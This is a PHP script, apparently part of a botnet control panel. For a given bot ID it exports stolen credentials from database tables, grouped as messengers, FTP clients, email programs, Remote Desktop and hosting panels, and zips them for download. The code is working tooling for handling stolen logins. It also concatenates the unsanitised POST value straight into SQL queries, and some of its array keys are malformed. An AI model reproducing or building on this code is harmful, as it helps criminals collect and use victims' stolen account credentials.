<?php

set_time_limit(0);

function get_log($row){
    global $filters, $uniq, $bot;
    
    $row = get_object_vars($row);
    
    $filters[$row['fid']]->name = encapsules($filters[$row['fid']]->name);

    foreach($filters[$row['fid']]->fields['name'] as $key => $item){
        file_put_contents('cache/gdl/' . $uniq . '/' . $filters[$row['fid']]->name . '.txt', $row['v' . $key] . ';', FILE_APPEND);
    }
    
    file_put_contents('cache/gdl/' . $uniq . '/' . $filters[$row['fid']]->name . '.txt', "\r\n", FILE_APPEND);
}

function get_log1($row){
    global $filters, $uniq, $bot;
    
    $row = get_object_vars($row);
    
    $filters[$row['fid']]->name = encapsules($filters[$row['fid']]->name);

    foreach($filters[$row['fid']]->fields['name'] as $key => $item){
        file_put_contents('cache/gdl/' . $uniq . '/' . $filters[$row['fid']]->name . '.txt', $row['v' . $key] . ';', FILE_APPEND);
    }
    
    file_put_contents('cache/gdl/' . $uniq . '/' . $filters[$row['fid']]->name . '.txt', $row['program'] . "\r\n", FILE_APPEND);
}

function get_filter($row){
    global $mysqli, $filters, $uniq, $bot;
    if(is_object($row)){
        $row->fields = json_decode(base64_decode($row->fields), true);
        $filters[$row->id] = $row;
        
        $mysqli->query('select *, concat(\''.$row->id.'\') fid from bf_filter_'.$row->id.' where ((uid = \''.$bot['uid'].'\') OR (uid = \'0'.$bot['uid'].'\'))', null, 'get_log');
        
        unset($filters[$row->id]);
    }else{
        $mysqli->query('select *, concat(\''.$row.'\') fid from bf_filter_'.$row.' where ((uid = \''.$bot['uid'].'\') OR (uid = \'0'.$bot['uid'].'\'))', null, 'get_log1');
    
        unset($filters[$row]);
    }
}

if(!empty($_POST['uid'])){
    $pref = explode('0', $_POST['uid'], 2);
    //error_reporting(-1);
    
    if(count($pref) == 2){
        $bot['prefix'] = strtoupper($pref[0]);
        $bot['uid'] = strtoupper($pref[1]);
        
        $uniq = md5(mt_rand() . time());
        
        mkdir('cache/gdl/' . $uniq . '/');
        chmod('cache/gdl/' . $uniq . '/', 0777);
        
        $filters = array();
        
        //$mysqli->query('SELECT * FROM bf_filters WHERE NOT isNULL(host)', null, 'get_filter');

        $filters['messengers']->name = 'Мессанджеры';
        $filters['messengers']->id = 'messengers';
        $filters['messengers']->fields['name'] = array(1 => '', 2 => '');
        
        $filters['ftps']->name = 'ФТП Клиенты';
        $filters['ftps']->id = 'ftps';
        $filters['ftps']->fields['name'] = array(1 => '', 2 => '', 3 => '');
        
        $filters['emailprograms->name'] = 'Почтовые программы';
        $filters['emailprograms->id'] = 'emailprograms';
        $filters['emailprograms->fields']['name'] = array(1 => '', 2 => '');
        
        $filters['rdp']->name = 'Remote Desktop Connection';
        $filters['rdp']->id = 'rdp';
        $filters['rdp']->fields['name'] = array(1 => '', 2 => '', 3 => '');
        
        $filters['panels']->name = 'Хостинг Панели';
        $filters['panels']->id = 'panels';
        $filters['panels']->fields['name'] = array(1 => '', 2 => '', 3 => '');
        
        get_filter('messengers');
        get_filter('ftps');
        get_filter('emailprograms');
        get_filter('rdp');
        get_filter('panels');

        $mysqli->query('SELECT * FROM bf_filters WHERE NOT isNULL(host)', null, 'get_filter');
        
        $fd = scandir('cache/gdl/' . $uniq . '/');
        unset($fd[0], $fd[1]);
        
        if(count($fd) > 0){
            $zip = new ZipArchive;
            file_put_contents('cache/gdl/' . $_POST['uid'] . '.zip', '');
            $res = $zip->open(realpath('cache/gdl/' . $_POST['uid'] . '.zip'), ZIPARCHIVE::OVERWRITE);
            if($res === TRUE){
                foreach($fd as $fs){
                    $zip->addFile('cache/gdl/' . $uniq . '/' . $fs, $fs);
                    //@unlink('cache/gdl/' . $uniq . '/' . $fs);
                }
                
                $zip->close();
            }
        }
        
        if(filesize('cache/gdl/' . $_POST['uid'] . '.zip') == 0) unlink('cache/gdl/' . $_POST['uid'] . '.zip');
        
        foreach($fd as $fs) @unlink('cache/gdl/' . $uniq . '/' . $fs);
        rmdir('cache/gdl/' . $uniq . '/');
        
        if(file_exists('cache/gdl/' . $_POST['uid'] . '.zip')){
            $smarty->assign('file_dl', $_POST['uid'] . '.zip');
        }else{
            $smarty->assign('file_dl', false);
        }
        /*
        $filters_db = $mysqli->query('SHOW TABLE STATUS WHERE NAME LIKE \'bf\_filter\_%\'');
        
        $search = array();
        foreach($filters_db as $db_data){
            $result = $mysqli->query('select count(id) count from ' . $db_data->Name . ' where (prefix = \''.$prefix.'\') AND ((uid = \''.$data.'\') OR (uid = \'0'.$data.'\'))');
            //print_rm('select id, count(id) from ' . $db_data->Name . ' where (prefix = \''.$prefix.'\') AND (uid = \''.$data.'\')');
            if($result->count > 0){
                $search[str_replace('bf_filter_', '', $db_data->Name)] = str_replace('bf_filter_', '', $db_data->Name);
            }
        }
        */
    }
}

?>